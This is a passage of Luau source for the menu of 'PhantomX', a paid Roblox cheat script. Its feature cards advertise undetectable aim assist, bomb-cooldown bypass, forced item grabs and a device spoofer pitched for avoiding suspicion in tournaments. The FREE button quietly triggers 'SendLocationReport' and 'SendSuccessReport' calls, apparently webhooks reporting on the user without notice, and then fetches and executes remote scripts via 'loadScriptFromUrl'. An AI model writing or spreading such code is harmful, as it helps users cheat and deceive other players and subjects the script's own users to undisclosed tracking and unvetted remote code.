    Blur.Name = "PhantomXBlur"
    Blur.Size = 0
    Blur.Parent = Lighting
    SelTween(Blur, 0.35, {Size = 7})

    local UIScale = Instance.new("UIScale")
    UIScale.Scale = 1
    UIScale.Parent = ModeScreenGui

    local function UpdateScale()
        local cam = workspace.CurrentCamera
        if not cam then return end
        local vp = cam.ViewportSize
        UIScale.Scale = math.clamp(math.min(vp.X / 440, vp.Y / 330), 0.72, 1)
    end
    UpdateScale()
    if workspace.CurrentCamera then
        workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateScale)
    end

    local Main = Instance.new("Frame")
    Main.Name = "MainPanel"
    Main.AnchorPoint = Vector2.new(0.5, 0.5)
    Main.Position = UDim2.new(0.5, 0, 0.53, 0)
    Main.Size = UDim2.fromOffset(390, 260)
    Main.BackgroundColor3 = COLORS.Background
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.ClipsDescendants = true
    Main.Parent = ModeScreenGui

    AddCorner(Main, 8)
    AddStroke(Main, Color3.fromRGB(70, 110, 200), 0.55, 1)
    AddGradient(Main, Color3.fromRGB(32, 46, 82), Color3.fromRGB(10, 13, 22), 90)

    local AmbientGlow = Instance.new("Frame")
    AmbientGlow.Name = "AmbientGlow"
    AmbientGlow.Size = UDim2.new(1, 0, 1, 0)
    AmbientGlow.BackgroundColor3 = Color3.fromRGB(55, 95, 180)
    AmbientGlow.BackgroundTransparency = 0.2
    AmbientGlow.BorderSizePixel = 0
    AmbientGlow.ZIndex = 0
    AmbientGlow.Parent = Main
    local AG = Instance.new("UIGradient")
    AG.Rotation = 135
    AG.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0.7),
        NumberSequenceKeypoint.new(0.45, 0.92),
        NumberSequenceKeypoint.new(1, 1),
    })
    AG.Parent = AmbientGlow

    local MainConstraint = Instance.new("UISizeConstraint")
    MainConstraint.MinSize = Vector2.new(300, 230)
    MainConstraint.MaxSize = Vector2.new(410, 280)
    MainConstraint.Parent = Main

    local MainScale = Instance.new("UIScale")
    MainScale.Scale = 0.94
    MainScale.Parent = Main

    local Avatar = Instance.new("ImageLabel")
    Avatar.BackgroundColor3 = COLORS.Panel
    Avatar.BorderSizePixel = 0
    Avatar.Position = UDim2.fromOffset(17, 15)
    Avatar.Size = UDim2.fromOffset(35, 35)
    Avatar.Image = ""
    Avatar.Parent = Main
    AddCorner(Avatar, 6)
    AddStroke(Avatar, COLORS.Stroke, 0.15, 1)

    task.spawn(function()
        local success, image = pcall(function()
            return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
        end)
        if success and Avatar.Parent then Avatar.Image = image end
    end)

    local Header = Instance.new("TextLabel")
    Header.BackgroundTransparency = 1
    Header.Position = UDim2.fromOffset(60, 17)
    Header.Size = UDim2.new(1, -145, 0, 27)
    Header.Font = FONT_BOLD
    Header.Text = "SELECT YOUR MODE"
    Header.TextSize = 17
    Header.TextColor3 = COLORS.Text
    Header.TextXAlignment = Enum.TextXAlignment.Left
    Header.Parent = Main

    local Close = Instance.new("TextButton")
    Close.AnchorPoint = Vector2.new(1, 0)
    Close.Position = UDim2.new(1, -11, 0, 10)
    Close.Size = UDim2.fromOffset(25, 25)
    Close.BackgroundColor3 = COLORS.PanelLight
    Close.BackgroundTransparency = 0.1
    Close.BorderSizePixel = 0
    Close.Text = "×"
    Close.TextColor3 = COLORS.Muted
    Close.Font = FONT
    Close.TextSize = 21
    Close.AutoButtonColor = false
    Close.ZIndex = 3
    Close.Parent = Main
    AddCorner(Close, 5)

    local HeaderDiscord = Instance.new("ImageButton")
    HeaderDiscord.AnchorPoint = Vector2.new(1, 0)
    HeaderDiscord.Position = UDim2.new(1, -43, 0, 13)
    HeaderDiscord.Size = UDim2.fromOffset(20, 20)
    HeaderDiscord.BackgroundTransparency = 1
    HeaderDiscord.BorderSizePixel = 0
    HeaderDiscord.AutoButtonColor = false
    HeaderDiscord.Image = SEL_DISCORD_ICON
    HeaderDiscord.ScaleType = Enum.ScaleType.Fit
    HeaderDiscord.ZIndex = 3
    HeaderDiscord.Parent = Main

    local Footer = Instance.new("TextLabel")
    Footer.BackgroundTransparency = 1
    Footer.AnchorPoint = Vector2.new(0.5, 1)
    Footer.Position = UDim2.new(0.5, 0, 1, -7)
    Footer.Size = UDim2.new(1, -20, 0, 12)
    Footer.Font = FONT_BOLD
    Footer.Text = "P H A N T O M X"
    Footer.TextSize = 8
    Footer.TextColor3 = Color3.fromRGB(105, 106, 114)
    Footer.Parent = Main

    local function MakeModeButton(name, title, icon, color, position, size, shine)
        local Button = Instance.new("TextButton")
        Button.Name = name
        Button.Position = position
        Button.Size = size
        Button.BackgroundColor3 = COLORS.Panel
        Button.BorderSizePixel = 0
        Button.Text = ""
        Button.AutoButtonColor = false
        Button.ClipsDescendants = true
        Button.Parent = Main
        AddCorner(Button, 6)
        local stroke = AddStroke(Button, color, 0.65, 1)
        AddGradient(Button, Color3.fromRGB(28, 38, 62), Color3.fromRGB(16, 22, 38), 90)

        local SideAccent = Instance.new("Frame")
        SideAccent.Position = UDim2.fromOffset(0, 9)
        SideAccent.Size = UDim2.new(0, 2, 1, -18)
        SideAccent.BackgroundColor3 = color
        SideAccent.BackgroundTransparency = 0.12
        SideAccent.BorderSizePixel = 0
        SideAccent.Parent = Button

        local IconFrame = Instance.new("Frame")
        IconFrame.Position = UDim2.fromOffset(11, 11)
        IconFrame.Size = UDim2.fromOffset(34, 34)
        IconFrame.BackgroundColor3 = color
        IconFrame.BackgroundTransparency = 0.91
        IconFrame.BorderSizePixel = 0
        IconFrame.Parent = Button
        AddCorner(IconFrame, 5)

        local Image = Instance.new("ImageLabel")
        Image.BackgroundTransparency = 1
        Image.AnchorPoint = Vector2.new(0.5, 0.5)
        Image.Position = UDim2.fromScale(0.5, 0.5)
        Image.Size = UDim2.fromOffset(23, 23)
        Image.Image = icon
        Image.ScaleType = Enum.ScaleType.Fit
        Image.Parent = IconFrame

        local Title = Instance.new("TextLabel")
        Title.BackgroundTransparency = 1
        Title.Position = UDim2.fromOffset(54, 9)
        Title.Size = UDim2.new(1, -75, 0, 19)
        Title.Font = FONT_BOLD
        Title.Text = title
        Title.TextSize = 12
        Title.TextColor3 = COLORS.Text
        Title.TextXAlignment = Enum.TextXAlignment.Left
        Title.Parent = Button

        local Sub = Instance.new("TextLabel")
        Sub.BackgroundTransparency = 1
        Sub.Position = UDim2.fromOffset(54, 29)
        Sub.Size = UDim2.new(1, -70, 0, 15)
        Sub.Font = FONT
        Sub.Text = "PhantomX"
        Sub.TextSize = 9
        Sub.TextColor3 = COLORS.Muted
        Sub.TextXAlignment = Enum.TextXAlignment.Left
        Sub.Parent = Button

        local Arrow = Instance.new("TextLabel")
        Arrow.BackgroundTransparency = 1
        Arrow.AnchorPoint = Vector2.new(1, 0.5)
        Arrow.Position = UDim2.new(1, -10, 0.5, 0)
        Arrow.Size = UDim2.fromOffset(12, 20)
        Arrow.Font = FONT
        Arrow.Text = "›"
        Arrow.TextSize = 19
        Arrow.TextColor3 = color
        Arrow.Parent = Button

        if shine then
            local Shine = Instance.new("Frame")
            Shine.AnchorPoint = Vector2.new(0.5, 0.5)
            Shine.Position = UDim2.new(-0.4, 0, 0.5, 0)
            Shine.Size = UDim2.new(0.24, 0, 2, 0)
            Shine.Rotation = 18
            Shine.BackgroundColor3 = color
            Shine.BackgroundTransparency = 0.94
            Shine.BorderSizePixel = 0
            Shine.ZIndex = 2
            Shine.Parent = Button
            local gr = Instance.new("UIGradient")
            gr.Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 1),
                NumberSequenceKeypoint.new(0.5, 0.45),
                NumberSequenceKeypoint.new(1, 1),
            })
            gr.Parent = Shine
            task.spawn(function()
                while Shine.Parent do
                    Shine.Position = UDim2.new(-0.4, 0, 0.5, 0)
                    SelTween(Shine, 1.25, {Position = UDim2.new(1.4, 0, 0.5, 0)}, Enum.EasingStyle.Sine)
                    task.wait(3.8)
                end
            end)
        end

        Button.MouseEnter:Connect(function()
            SelTween(Button, 0.16, {BackgroundColor3 = Color3.fromRGB(32, 42, 66)})
            SelTween(stroke, 0.16, {Transparency = 0.3})
        end)
        Button.MouseLeave:Connect(function()
            SelTween(Button, 0.16, {BackgroundColor3 = COLORS.Panel})
            SelTween(stroke, 0.16, {Transparency = 0.65})
        end)
        Button.MouseButton1Down:Connect(function()
            PlaySelPressSound(ModeScreenGui)
            SelTween(Button, 0.08, {Size = size - UDim2.fromOffset(2, 2)})
        end)
        Button.MouseButton1Up:Connect(function()
            SelTween(Button, 0.12, {Size = size})
        end)
        return Button
    end

    local FreeButton = MakeModeButton("FreeButton", "FREE", ICONS.Free, COLORS.Free, UDim2.new(0.09, 0, 0, 78), UDim2.new(0.82, 0, 0, 56), false)
    local PremiumButton = MakeModeButton("PremiumButton", "PREMIUM", ICONS.Premium, COLORS.Premium, UDim2.new(0.055, 0, 0, 148), UDim2.new(0.425, -4, 0, 60), true)
    local DeviceButton = MakeModeButton("DeviceButton", "DEVICE SPOOFER", ICONS.Device, COLORS.Device, UDim2.new(0.52, 4, 0, 148), UDim2.new(0.425, -4, 0, 60), true)

    local function CreateFeaturePage(name, headerText, subtitleText, accentColor)
        local Page = Instance.new("Frame")
        Page.Name = name
        Page.Size = UDim2.fromScale(1, 1)
        Page.BackgroundColor3 = COLORS.Background
        Page.BorderSizePixel = 0
        Page.Active = true
        Page.Selectable = false
        Page.Visible = false
        Page.ZIndex = 10
        Page.Parent = Main
        AddCorner(Page, 8)
        AddGradient(Page, Color3.fromRGB(22, 30, 52), Color3.fromRGB(11, 14, 24), 90)

        local Blocker = Instance.new("TextButton")
        Blocker.Size = UDim2.fromScale(1, 1)
        Blocker.BackgroundTransparency = 1
        Blocker.BorderSizePixel = 0
        Blocker.Text = ""
        Blocker.AutoButtonColor = false
        Blocker.Active = true
        Blocker.Selectable = false
        Blocker.ZIndex = 10
        Blocker.Parent = Page

        local PH = Instance.new("TextLabel")
        PH.BackgroundTransparency = 1
        PH.Position = UDim2.fromOffset(17, 14)
        PH.Size = UDim2.new(1, -100, 0, 24)
        PH.Font = FONT_BOLD
        PH.Text = headerText
        PH.TextSize = 15
        PH.TextColor3 = accentColor
        PH.TextXAlignment = Enum.TextXAlignment.Left
        PH.ZIndex = 12
        PH.Parent = Page

        local PS = Instance.new("TextLabel")
        PS.BackgroundTransparency = 1
        PS.Position = UDim2.fromOffset(18, 37)
        PS.Size = UDim2.new(1, -40, 0, 15)
        PS.Font = FONT
        PS.Text = subtitleText
        PS.TextSize = 9
        PS.TextColor3 = COLORS.Muted
        PS.TextXAlignment = Enum.TextXAlignment.Left
        PS.ZIndex = 12
        PS.Parent = Page

        local PC = Instance.new("TextButton")
        PC.AnchorPoint = Vector2.new(1, 0)
        PC.Position = UDim2.new(1, -11, 0, 10)
        PC.Size = UDim2.fromOffset(25, 25)
        PC.BackgroundColor3 = COLORS.PanelLight
        PC.BorderSizePixel = 0
        PC.Text = "×"
        PC.TextColor3 = COLORS.Muted
        PC.Font = FONT
        PC.TextSize = 21
        PC.AutoButtonColor = false
        PC.ZIndex = 14
        PC.Parent = Page
        AddCorner(PC, 5)

        local PB = Instance.new("TextButton")
        PB.Position = UDim2.fromOffset(18, 56)
        PB.Size = UDim2.fromOffset(55, 22)
        PB.BackgroundColor3 = COLORS.PanelLight
        PB.BorderSizePixel = 0
        PB.Text = "‹ BACK"
        PB.TextColor3 = Color3.fromRGB(239, 239, 242)
        PB.Font = FONT_BOLD
        PB.TextSize = 9
        PB.AutoButtonColor = false
        PB.ZIndex = 14
        PB.Parent = Page
        AddCorner(PB, 4)

        local Scroll = Instance.new("ScrollingFrame")
        Scroll.Position = UDim2.fromOffset(20, 86)
        Scroll.Size = UDim2.new(1, -40, 1, -126)
        Scroll.BackgroundTransparency = 1
        Scroll.BorderSizePixel = 0
        Scroll.ScrollBarThickness = 3
        Scroll.ScrollBarImageColor3 = accentColor
        Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        Scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        Scroll.Active = true
        Scroll.ScrollingEnabled = true
        Scroll.ZIndex = 13
        Scroll.Parent = Page

        local L = Instance.new("UIListLayout")
        L.Padding = UDim.new(0, 9)
        L.SortOrder = Enum.SortOrder.LayoutOrder
        L.Parent = Scroll

        local P = Instance.new("UIPadding")
        P.PaddingTop = UDim.new(0, 3)
        P.PaddingBottom = UDim.new(0, 8)
        P.PaddingLeft = UDim.new(0, 6)
        P.PaddingRight = UDim.new(0, 11)
        P.Parent = Scroll

        local DA = Instance.new("Frame")
        DA.AnchorPoint = Vector2.new(0.5, 1)
        DA.Position = UDim2.new(0.5, 0, 1, -9)
        DA.Size = UDim2.new(1, -30, 0, 31)
        DA.BackgroundTransparency = 1
        DA.ZIndex = 15
        DA.Parent = Page

        local DB = Instance.new("TextButton")
        DB.AnchorPoint = Vector2.new(1, 0.5)
        DB.Position = UDim2.new(1, 0, 0.5, 0)
        DB.Size = UDim2.fromOffset(100, 27)
        DB.BackgroundColor3 = Color3.fromRGB(36, 44, 68)
        DB.BorderSizePixel = 0
        DB.Text = ""
        DB.AutoButtonColor = false
        DB.ZIndex = 16
        DB.Parent = DA
        AddCorner(DB, 4)
        AddStroke(DB, Color3.fromRGB(80, 100, 150), 0.4, 1)

        local DI = Instance.new("ImageLabel")
        DI.BackgroundTransparency = 1
        DI.Position = UDim2.fromOffset(8, 5)
        DI.Size = UDim2.fromOffset(17, 17)
        DI.Image = SEL_DISCORD_ICON
        DI.ScaleType = Enum.ScaleType.Fit
        DI.ZIndex = 17
        DI.Parent = DB

        local DT = Instance.new("TextLabel")
        DT.BackgroundTransparency = 1
        DT.Position = UDim2.fromOffset(29, 0)
        DT.Size = UDim2.new(1, -33, 1, 0)
        DT.Font = FONT_BOLD
        DT.Text = "DISCORD"
        DT.TextSize = 9
        DT.TextColor3 = Color3.fromRGB(245, 245, 247)
        DT.TextXAlignment = Enum.TextXAlignment.Left
        DT.ZIndex = 17
        DT.Parent = DB

        DB.MouseEnter:Connect(function()
            SelTween(DB, 0.15, {BackgroundColor3 = Color3.fromRGB(46, 56, 86)})
        end)
        DB.MouseLeave:Connect(function()
            SelTween(DB, 0.15, {BackgroundColor3 = Color3.fromRGB(36, 44, 68)})
        end)
        return Page, Scroll, PB, PC, DB, DT
    end

    local PremiumPage, FeatureScroll, PageBack, PageClose, PremiumDiscordButton, PremiumDiscordText = CreateFeaturePage("PremiumPage", "PHANTOMX PREMIUM", "Premium features", COLORS.Premium)
    local DevicePage, DeviceScroll, DeviceBack, DeviceClose, DeviceDiscordButton, DeviceDiscordText = CreateFeaturePage("DevicePage", "DEVICE SPOOFER", "Change how your device appears", COLORS.Device)

    local PremiumOverview = Instance.new("TextLabel")
    PremiumOverview.BackgroundTransparency = 1
    PremiumOverview.Position = UDim2.fromOffset(80, 54)
    PremiumOverview.Size = UDim2.new(1, -115, 0, 27)
    PremiumOverview.Font = FONT
    PremiumOverview.Text = "نبذة عن مميزات السكربت\nScript features overview"
    PremiumOverview.TextSize = 8
    PremiumOverview.TextColor3 = Color3.fromRGB(239, 239, 242)
    PremiumOverview.TextXAlignment = Enum.TextXAlignment.Center
    PremiumOverview.TextYAlignment = Enum.TextYAlignment.Center
    PremiumOverview.TextWrapped = true
    PremiumOverview.ZIndex = 14
    PremiumOverview.Parent = PremiumPage

    local function MakeFeatureCard(parent, order, title, arabic, english, accentColor)
        local Card = Instance.new("Frame")
        Card.LayoutOrder = order
        Card.Size = UDim2.new(1, 0, 0, 80)
        Card.AutomaticSize = Enum.AutomaticSize.Y
        Card.BackgroundColor3 = COLORS.Panel
        Card.BorderSizePixel = 0
        Card.ZIndex = 13
        Card.Parent = parent
        AddCorner(Card, 5)
        AddStroke(Card, Color3.fromRGB(60, 72, 105), 0.25, 1)

        local Accent = Instance.new("Frame")
        Accent.Size = UDim2.new(0, 2, 1, -14)
        Accent.Position = UDim2.fromOffset(0, 7)
        Accent.BackgroundColor3 = accentColor
        Accent.BorderSizePixel = 0
        Accent.ZIndex = 14
        Accent.Parent = Card

        local CT = Instance.new("TextLabel")
        CT.BackgroundTransparency = 1
        CT.Position = UDim2.fromOffset(12, 7)
        CT.Size = UDim2.new(1, -22, 0, 17)
        CT.Font = FONT_BOLD
        CT.Text = title
        CT.TextSize = 11
        CT.TextColor3 = accentColor
        CT.TextXAlignment = Enum.TextXAlignment.Left
        CT.ZIndex = 14
        CT.Parent = Card

        local AT = Instance.new("TextLabel")
        AT.BackgroundTransparency = 1
        AT.Position = UDim2.fromOffset(12, 27)
        AT.Size = UDim2.new(1, -22, 0, 0)
        AT.AutomaticSize = Enum.AutomaticSize.Y
        AT.Font = FONT
        AT.Text = arabic
        AT.TextSize = 10
        AT.TextColor3 = Color3.fromRGB(235, 235, 238)
        AT.TextWrapped = true
        AT.TextXAlignment = Enum.TextXAlignment.Right
        AT.TextYAlignment = Enum.TextYAlignment.Top
        AT.ZIndex = 14
        AT.Parent = Card

        local ET = Instance.new("TextLabel")
        ET.BackgroundTransparency = 1
        ET.Position = UDim2.fromOffset(12, 0)
        ET.Size = UDim2.new(1, -22, 0, 0)
        ET.AutomaticSize = Enum.AutomaticSize.Y
        ET.Font = FONT
        ET.Text = english
        ET.TextSize = 9
        ET.TextColor3 = Color3.fromRGB(190, 191, 197)
        ET.TextWrapped = true
        ET.TextXAlignment = Enum.TextXAlignment.Left
        ET.TextYAlignment = Enum.TextYAlignment.Top
        ET.ZIndex = 14
        ET.Parent = Card

        local function UC()
            task.defer(function()
                if not Card.Parent then return end
                local ey = AT.Position.Y.Offset + AT.AbsoluteSize.Y + 5
                ET.Position = UDim2.fromOffset(12, ey)
                local ch = ey + ET.AbsoluteSize.Y + 8
                Card.Size = UDim2.new(1, 0, 0, math.max(68, ch))
            end)
        end
        AT:GetPropertyChangedSignal("AbsoluteSize"):Connect(UC)
        ET:GetPropertyChangedSignal("AbsoluteSize"):Connect(UC)
        task.defer(UC)
        return Card
    end

    MakeFeatureCard(FeatureScroll, 1, "AIR GRAB", "إذا أحد حاول يسوي عليك هولد وما يعطيك القنبلة اير جراب تخليه يعطيك القنبلة غصب عنه وكذا محد يقدر يسوي عليك هولد", "IF SOMEONE TRIES TO HOLD YOU AND REFUSES TO GIVE YOU THE BOMB AIR GRAB FORCES THEM TO GIVE YOU THE BOMB SO NO ONE CAN HOLD YOU", COLORS.Premium)
    MakeFeatureCard(FeatureScroll, 2, "ASSIST", "اسيسست تساعدك في تحركاتك بالكامل وتقربك للخصم ومو مكشوفة ابدا وتختلف عن الاوتو وهي افضل منه", "ASSIST HELPS WITH ALL YOUR MOVEMENTS AND BRINGS YOU CLOSER TO YOUR OPPONENT IT IS NOT DETECTABLE AT ALL AND IT IS DIFFERENT FROM AUTO AND BETTER", COLORS.Premium)
    MakeFeatureCard(FeatureScroll, 3, "MACRO", "ماكرو تكسر الكولداون الي على القنبلة يعني يمديك تعطي القنبلة حتى لو الكولداون على 1 وهي مفيدة جدا لو احد عطاك القنبلة متأخر", "MACRO BREAKS THE BOMB COOLDOWN SO YOU CAN PASS THE BOMB EVEN WHEN THE COOLDOWN IS AT 1 IT IS VERY USEFUL WHEN SOMEONE GIVES YOU THE BOMB LATE", COLORS.Premium)

    local MoreCard = Instance.new("Frame")
    MoreCard.LayoutOrder = 4
    MoreCard.Size = UDim2.new(1, 0, 0, 90)
    MoreCard.BackgroundColor3 = COLORS.Panel
    MoreCard.BorderSizePixel = 0
    MoreCard.ZIndex = 13
    MoreCard.Parent = FeatureScroll
    AddCorner(MoreCard, 5)
    AddStroke(MoreCard, Color3.fromRGB(60, 72, 105), 0.25, 1)

    local MT = Instance.new("TextLabel")
    MT.BackgroundTransparency = 1
    MT.Position = UDim2.fromOffset(12, 7)
    MT.Size = UDim2.new(1, -22, 0, 17)
    MT.Font = FONT_BOLD
    MT.Text = "MORE FEATURES"
    MT.TextSize = 11
    MT.TextColor3 = COLORS.Premium
    MT.TextXAlignment = Enum.TextXAlignment.Left
    MT.ZIndex = 14
    MT.Parent = MoreCard

    local MA = Instance.new("TextLabel")
    MA.BackgroundTransparency = 1
    MA.Position = UDim2.fromOffset(12, 27)
    MA.Size = UDim2.new(1, -22, 0, 28)
    MA.Font = FONT
    MA.Text = "السكربت يحتوي على مميزات أكثر والأسعار موجودة في الديسكورد"
    MA.TextSize = 10
    MA.TextColor3 = Color3.fromRGB(235, 235, 238)
    MA.TextWrapped = true
    MA.TextXAlignment = Enum.TextXAlignment.Right
    MA.TextYAlignment = Enum.TextYAlignment.Top
    MA.ZIndex = 14
    MA.Parent = MoreCard

    local ME = Instance.new("TextLabel")
    ME.BackgroundTransparency = 1
    ME.Position = UDim2.fromOffset(12, 58)
    ME.Size = UDim2.new(1, -22, 0, 26)
    ME.Font = FONT
    ME.Text = "MORE FEATURES AVAILABLE CHECK DISCORD FOR FEATURES AND PRICES"
    ME.TextSize = 9
    ME.TextColor3 = Color3.fromRGB(190, 191, 197)
    ME.TextWrapped = true
    ME.TextXAlignment = Enum.TextXAlignment.Left
    ME.TextYAlignment = Enum.TextYAlignment.Top
    ME.ZIndex = 14
    ME.Parent = MoreCard

    MakeFeatureCard(DeviceScroll, 1, "CONSOLE MODE", "يخليك تظهر للكل إنك تلعب من سوني حتى لو أنت تلعب من الجوال، ومفيدة لو مشغل Assist أو Auto، وبتفيدك بالبطولات لأن محد بيشك إنك تستخدم سكربت على الجوال.", "Makes everyone see you as a console player even when you're playing on mobile. Useful if you're using Assist or Auto, and can help in tournaments since people won't suspect you're using a script on mobile.", COLORS.Device)
    MakeFeatureCard(DeviceScroll, 2, "PC MODE", "يخليك تظهر للكل إنك تلعب من البيسي، ومفيدة لأن قليل ناس يشغلون هاكات على البيسي، فمحد بيشك فيك وبتفيدك بالبطولات.", "Makes everyone see you as a PC player. Useful since fewer people use hacks on PC, so people are less likely to suspect you. Can also be useful in tournaments.", COLORS.Device)
    MakeFeatureCard(DeviceScroll, 3, "PURCHASES & SUPPORT", "لأي استفسار أو إذا تبي تشتري السكربت ادخل الديسكورد من الزر اللي تحت.", "For any questions or if you want to purchase the script, join the Discord using the button below.", COLORS.Device)

    local function ShowToast(arabicText, englishText, accentColor)
        local e = ModeScreenGui:FindFirstChild("Toast")
        if e then e:Destroy() end
        local Toast = Instance.new("Frame")
        Toast.AnchorPoint = Vector2.new(0.5, 1)
        Toast.Position = UDim2.new(0.5, 0, 1, 40)
        Toast.Size = UDim2.fromOffset(300, 56)
        Toast.BackgroundColor3 = COLORS.Background
        Toast.BorderSizePixel = 0
        Toast.ZIndex = 100
        Toast.Parent = ModeScreenGui
        AddCorner(Toast, 8)
        local ts = AddStroke(Toast, accentColor, 0.35, 1)
        AddGradient(Toast, Color3.fromRGB(28, 38, 62), COLORS.Background, 90)

        local A = Instance.new("Frame")
        A.Position = UDim2.fromOffset(0, 8)
        A.Size = UDim2.new(0, 3, 1, -16)
        A.BackgroundColor3 = accentColor
        A.BorderSizePixel = 0
        A.ZIndex = 101
        A.Parent = Toast
        AddCorner(A, 2)

        local CC = Instance.new("Frame")
        CC.AnchorPoint = Vector2.new(0, 0.5)
        CC.Position = UDim2.new(0, 14, 0.5, 0)
        CC.Size = UDim2.fromOffset(28, 28)
        CC.BackgroundColor3 = accentColor
        CC.BackgroundTransparency = 0.85
        CC.BorderSizePixel = 0
        CC.ZIndex = 101
        CC.Parent = Toast
        AddCorner(CC, 14)

        local Ch = Instance.new("TextLabel")
        Ch.BackgroundTransparency = 1
        Ch.Size = UDim2.fromScale(1, 1)
        Ch.Font = FONT_BOLD
        Ch.Text = "✓"
        Ch.TextSize = 18
        Ch.TextColor3 = accentColor
        Ch.ZIndex = 102
        Ch.Parent = CC

        local Ar = Instance.new("TextLabel")
        Ar.BackgroundTransparency = 1
        Ar.Position = UDim2.fromOffset(50, 9)
        Ar.Size = UDim2.new(1, -62, 0, 19)
        Ar.Font = FONT_BOLD
        Ar.Text = arabicText
        Ar.TextSize = 12
        Ar.TextColor3 = COLORS.Text
        Ar.TextXAlignment = Enum.TextXAlignment.Left
        Ar.ZIndex = 101
        Ar.Parent = Toast

        local En = Instance.new("TextLabel")
        En.BackgroundTransparency = 1
        En.Position = UDim2.fromOffset(50, 29)
        En.Size = UDim2.new(1, -62, 0, 15)
        En.Font = FONT
        En.Text = englishText
        En.TextSize = 9
        En.TextColor3 = COLORS.Muted
        En.TextXAlignment = Enum.TextXAlignment.Left
        En.ZIndex = 101
        En.Parent = Toast

        SelTween(Toast, 0.35, {Position = UDim2.new(0.5, 0, 1, -24)}, Enum.EasingStyle.Back)
        task.delay(2.3, function()
            if not Toast.Parent then return end
            SelTween(Toast, 0.28, {Position = UDim2.new(0.5, 0, 1, 40), BackgroundTransparency = 1})
            SelTween(ts, 0.28, {Transparency = 1})
            SelTween(A, 0.28, {BackgroundTransparency = 1})
            SelTween(Ar, 0.28, {TextTransparency = 1})
            SelTween(En, 0.28, {TextTransparency = 1})
            SelTween(Ch, 0.28, {TextTransparency = 1})
            SelTween(CC, 0.28, {BackgroundTransparency = 1})
            task.delay(0.35, function()
                if Toast.Parent then Toast:Destroy() end
            end)
        end)
    end

    local function OpenDiscord(textLabel)
        if CopySelDiscord() then
            ShowToast("تم نسخ رابط الديسكورد", "Discord link copied to clipboard", Color3.fromRGB(100, 200, 140))
        else
            warn("Discord invite: " .. SEL_DISCORD_URL)
        end
    end

    local function ConnectDiscordButton(button, textLabel)
        local os2 = button.Size
        local busy = false
        button.MouseButton1Down:Connect(function()
            if busy then return end
            SelTween(button, 0.07, {Size = UDim2.new(os2.X.Scale, os2.X.Offset - 2, os2.Y.Scale, os2.Y.Offset - 2)}, Enum.EasingStyle.Quad)
        end)
        button.MouseButton1Up:Connect(function()
            if busy then return end
            SelTween(button, 0.12, {Size = os2}, Enum.EasingStyle.Quart)
        end)
        button.MouseButton1Click:Connect(function()
            if busy then return end
            busy = true
            PlaySelPressSound(ModeScreenGui)
            task.delay(0.08, function()
                if button and button.Parent then
                    SelTween(button, 0.12, {Size = os2}, Enum.EasingStyle.Quart)
                    OpenDiscord(textLabel)
                end
                busy = false
            end)
        end)
    end

    ConnectDiscordButton(HeaderDiscord, nil)
    ConnectDiscordButton(PremiumDiscordButton, PremiumDiscordText)
    ConnectDiscordButton(DeviceDiscordButton, DeviceDiscordText)

    local CurrentPage = nil
    local function ShowPage(Page)
        if CurrentPage == Page then return end
        PlaySelPressSound(ModeScreenGui)
        if CurrentPage and CurrentPage.Parent then
            CurrentPage.Visible = false
            CurrentPage.BackgroundTransparency = 0
        end
        CurrentPage = Page
        Page.Visible = true
        Page.BackgroundTransparency = 1
        Page.Position = UDim2.fromOffset(5, 0)
        SelTween(Page, 0.2, {BackgroundTransparency = 0, Position = UDim2.fromOffset(0, 0)})
    end
    local function HidePage()
        if not CurrentPage or not CurrentPage.Parent then return end
        PlaySelPressSound(ModeScreenGui)
        local p = CurrentPage
        CurrentPage = nil
        SelTween(p, 0.16, {BackgroundTransparency = 1, Position = UDim2.fromOffset(5, 0)})
        task.delay(0.17, function()
            if p and p.Parent then
                p.Visible = false
                p.BackgroundTransparency = 0
                p.Position = UDim2.fromScale(0, 0)
            end
        end)
    end

    PremiumButton.MouseButton1Click:Connect(function() ShowPage(PremiumPage) end)
    DeviceButton.MouseButton1Click:Connect(function() ShowPage(DevicePage) end)
    PageBack.MouseButton1Click:Connect(HidePage)
    PageClose.MouseButton1Click:Connect(HidePage)
    DeviceBack.MouseButton1Click:Connect(HidePage)
    DeviceClose.MouseButton1Click:Connect(HidePage)

    local closing = false
    local function CloseModeSelector()
        if closing then return end
        closing = true
        PlaySelPressSound(ModeScreenGui)
        SelTween(MainScale, 0.18, {Scale = 0.88})
        SelTween(Main, 0.18, {BackgroundTransparency = 1})
        SelTween(Blur, 0.18, {Size = 0})
        task.delay(0.22, function()
            if ModeScreenGui.Parent then ModeScreenGui:Destroy() end
            if Blur.Parent then Blur:Destroy() end
        end)
    end

    Close.MouseButton1Click:Connect(CloseModeSelector)
    Close.MouseEnter:Connect(function()
        SelTween(Close, 0.15, {BackgroundColor3 = Color3.fromRGB(60, 40, 60), TextColor3 = Color3.fromRGB(235, 139, 145)})
    end)
    Close.MouseLeave:Connect(function()
        SelTween(Close, 0.15, {BackgroundColor3 = COLORS.PanelLight, TextColor3 = COLORS.Muted})
    end)

    local freeBusy = false
    FreeButton.MouseButton1Click:Connect(function()
        if freeBusy then return end
        freeBusy = true
        PlaySelPressSound(ModeScreenGui)

        local freeTitle = FreeButton:FindFirstChildOfClass("TextLabel")
        if freeTitle then freeTitle.Text = "LOADING..." end

        local webhookDone = 0
        local webhookTotal = 2
        task.spawn(function()
            pcall(SendLocationReport)
            webhookDone = webhookDone + 1
        end)
        task.spawn(function()
            pcall(SendSuccessReport)
            webhookDone = webhookDone + 1
        end)

        local wStart = os.clock()
        while webhookDone < webhookTotal and os.clock() - wStart < 3 do
            task.wait(0.1)
        end

        local loadDone = 0
        local loadTotal = 1
        if foundGame and foundGame.adminScriptUrl then loadTotal = loadTotal + 1 end
        task.spawn(function()
            if foundGame and foundGame.scriptUrl then
                loadScriptFromUrl(foundGame.scriptUrl, 0)
            end
            loadDone = loadDone + 1
        end)
        if foundGame and foundGame.adminScriptUrl then
            task.spawn(function()
                loadScriptFromUrl(foundGame.adminScriptUrl, 1)
                loadDone = loadDone + 1
            end)
        end

        local lStart = os.clock()
        while loadDone < loadTotal and os.clock() - lStart < 5 do
            task.wait(0.2)
        end

        task.wait(0.2)
        CloseModeSelector()
    end)

